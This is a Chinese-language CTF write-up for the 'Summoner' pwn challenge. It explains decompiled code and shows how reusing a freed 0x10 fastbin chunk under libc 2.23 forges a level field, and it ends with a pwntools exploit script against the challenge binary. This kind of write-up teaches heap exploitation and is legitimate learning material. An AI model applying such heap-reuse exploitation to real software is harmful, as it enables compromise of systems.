## Summoner

- 题目描述：

  > 邪恶召唤师拦住了你的去路。这将是一场召唤师之间的对决。 
  >
  > By *Mercurio*
  
 - 题目附件：[summoner](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Summoner/summoner)

 - 考察点：fastbin回收机制

 - 难度：简单

 - 初始分值：250

 - 最终分值：239

 - 完成人数：3

### 程序分析

功能：创建小怪、释放小怪、升级小怪、显示等级、派小怪打BOSS。

限制：只可以创建一个小怪，最高升到4级，只有5级小怪可以打败BOSS，给flag

分析一下，不难看出小怪结构体如下：

```c
struct imagin{
	char *name;
	int  level;
};
```

`summon`功能如下：

```c
cmd = "summon";
if ( !strncmp(&s, "summon", 6uLL) ){
    if ( imagin ){
        puts("Already have one creature. Release it first.");
    }
    else{
        cmd = "\n";
        nptr = strtok(&v11, "\n");
        if ( nptr ){
            imagin = malloc(0x10uLL);
            if ( !imagin ){
                puts("malloc() returned NULL. Out of Memory\n");
                exit(-1);
            }
            *imagin = strdup(nptr);             // call malloc
            cmd = nptr;
            printf("Current creature:\"%s\"\n", nptr);
        }
        else{
            puts("Invalid command");
        }
    }
}
```

`summon`的时候会先`malloc`一个`0x10`的chunk，随后的`strdup`也会调用`malloc`，chunk的大小取决于小怪名字的长度。

`release`功能如下：

```c
cmd = "release";
if ( !strncmp(&s, "release", 7uLL) ){
	if ( imagin ){
		free(*imagin);
		imagin = 0LL;
		puts("Released.");
	}
else{
puts("No creature summoned.");
}
```

`release`的时候释放了`strdup`分配的内存。

### 解题思路

题目环境是`libc2.23`，没开`t-cache`机制，所以可以控制小怪的名字长度，分配一个`0x10`大小的chunk，然后释放掉它，这样就有了一个`0x10`的`fastbin`，再次`summon`小怪的时候，小怪结构体会被分配到`strdup`用过的chunk，chunk中的数据没有被清空，只要让`chunk+8=5`即可伪造等级

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './summoner'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
sla('> ','summon aaaaaaaa\5') 
sla('> ','release')
sla('> ','summon aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
sla('> ','strike')

p.interactive()
```

### 官方wp

超级详细的[Summoner](https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Summoner)解析